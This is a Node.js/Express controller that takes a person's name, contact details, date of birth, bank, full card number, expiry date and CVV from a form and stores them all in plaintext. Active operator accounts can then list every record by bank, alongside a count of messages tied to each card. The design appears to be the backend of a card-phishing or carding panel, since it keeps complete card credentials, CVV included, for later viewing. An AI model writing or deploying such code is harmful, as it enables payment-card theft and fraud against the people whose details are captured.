const Customer = require('../models/customer');
const CustomerMessage = require('../models/customerMessage');

function determineCardType(firstFourDigits) {
    // Visa cards start with '4'
    if (/^4/.test(firstFourDigits)) {
        return 'Visa';
    }

    // MasterCard numbers start with '5'
    if (/^5/.test(firstFourDigits)) {
        return 'MasterCard';
    }

    // Discover cards start with '6'
    if (/^6/.test(firstFourDigits)) {
        return 'Discover';
    }

    // American Express cards start with '34' or '37'
    if (/^34|^37/.test(firstFourDigits)) {
        return 'American Express';
    }

    // Add more card types and their patterns as needed

    return 'Unknown'; // Default to 'Unknown' if no matching pattern
}


exports.submitDetails = async (req, res) => {
    try {
        const { name, email, mobile, dob, state, bank, cardNo, expiryDate, cvv, cardHolderName } = req.body;

        // Extract the first 4 digits of the card number
        const firstFourDigits = cardNo.substring(0, 4);

        // Determine the card type based on the first 4 digits
        const cardType = determineCardType(firstFourDigits);

        const newCustomer = new Customer({
            name,
            email,
            mobile,
            dob,
            state,
            bank,
            cardNo,
            cardType,  // Set the card type based on the first 4 digits
            expiryDate,
            cvv,
            cardHolderName
        });

        // Save the new customer to the database
        await newCustomer.save();

        return res.status(201).json({ message: 'Details submitted successfully' });
    } catch (error) {
        console.error('Error during Details Submission:', error);
        return res.status(500).json({ message: 'Something went wrong' });
    }
};

exports.getDetails = async (req, res) => {
    try {
        const authenticatedUser = req.user;
        const status = authenticatedUser.status;

        if (status === 'active') {
            const customers = await Customer.find()
            .sort({ createdAt: -1 });

            const { bank } = req.query; // Assuming you pass the bank as a query parameter

            const filteredCustomers = bank
                ? customers.filter(customer => customer.bank === bank)
                : customers;

            const customerDetails = await Promise.all(
                filteredCustomers.map(async (customer) => {
                    const { mobile, cardNo } = customer;
                    const messageCount = await CustomerMessage.countDocuments({ mobile, cardNo, isOpen: false });
                    return { ...customer.toObject(), messageCount };
                })
            );

            res.json({ customer:customerDetails });
        } else {
            return res.status(409).json({ message: 'Your Profile Is not Active to see customers Details' });
        }
    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: 'Failed to fetch customers' });
    }
};